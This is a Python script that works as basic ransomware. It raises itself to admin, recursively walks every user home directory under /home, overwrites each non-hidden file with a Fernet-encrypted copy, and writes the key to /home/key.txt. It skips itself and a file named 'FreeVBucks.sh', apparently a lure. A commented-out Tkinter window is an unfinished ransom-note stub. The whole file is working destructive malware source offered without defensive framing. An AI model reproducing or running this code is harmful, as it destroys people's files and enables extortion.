import os
import pyuac
import tkinter as tk
from cryptography.fernet import Fernet


def main():
    base_path = "/home"
    slash = "/"
    ignore = ['FreeVBucks.sh', "encryptor.py"]
    pyuac.runAsAdmin()
    directories = get_users(base_path, slash)
    key = Fernet.generate_key()
    f = Fernet(key)

    loop(directories, ignore, slash, f)
    write_file_key(base_path, key.decode())


def get_users(base_path: str, slash: str):
    directories = []
    for file in os.listdir(base_path):
        if os.path.isdir(base_path + slash + file):
            print(base_path + slash + file)
            directories.append(base_path + slash + file)
    return directories


def loop(directories: list[str], ignore: list[str], slash: str, f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file in ignore:
                        continue
                    if file in file[0] == ".":
                        continue
                    if os.path.isfile(directory + slash + file):
                        print(directory + slash + file)
                        read(directory + slash + file, f)
                    if os.path.isdir(directory + slash + file):
                        aux_directories.append(directory + slash + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
        magic(content, file_path, f)


def magic(content, file_path: str, f: Fernet):
    e_content = f.encrypt(content)
    with open(file_path, "wb") as file:
        file.write(e_content)


# def show_warning():
#     window = tk.Tk(className='Warning')
#     window.geometry("500x200")
#     greeting = tk.Label(text="Hello, Tkinter", background="black")
#     greeting.pack()
#     window.mainloop()


def write_file_key(base_path: str, key: str):
    with open(f'{base_path}/key.txt', "w") as file:
        file.write(f'KEY: {key}')


if __name__ == "__main__":
    main()
